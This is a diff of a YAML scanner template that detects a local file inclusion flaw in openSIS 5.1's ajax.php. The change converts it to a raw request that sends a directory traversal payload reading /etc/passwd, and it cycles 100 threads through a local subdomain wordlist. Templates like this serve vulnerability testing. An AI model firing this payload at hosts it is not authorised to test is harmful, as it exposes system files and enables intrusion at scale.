@@ -1,27 +1,37 @@
-id: opensis-lfi
-
+id: opensis-lfi 1
 info:
-  name: openSIS 5.1 - 'ajax.php' Local File Inclusion
   author: pikpikcu
+  name: openSIS 5.1 - 'ajax.php' Local File Inclusion
+  reference: '- https://www.exploit-db.com/exploits/38039
+
+    - https://www.securityfocus.com/bid/56598/info
+
+    '
   severity: high
-  description: An attacker can exploit a vulnerability in openSIS to obtain potentially sensitive information and execute arbitrary local scripts in the context of the Web server process. This may allow the attacker to compromise the application and computer; other attacks are also possible.
-  reference:
-    - https://www.exploit-db.com/exploits/38039
   tags: opensis,lfi
+requests:
+- attack: sniper
+  matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
+    HTTP/1.1
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php"
-      - "{{BaseURL}}/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php"
+    Host: {{Subdomains}}
 
-    matchers-condition: and
-    matchers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
+    Accept-Encoding: gzip, deflate
 
-      - type: status
-        status:
-          - 200
+    Connection: close
+
+    '
+  threads: 100
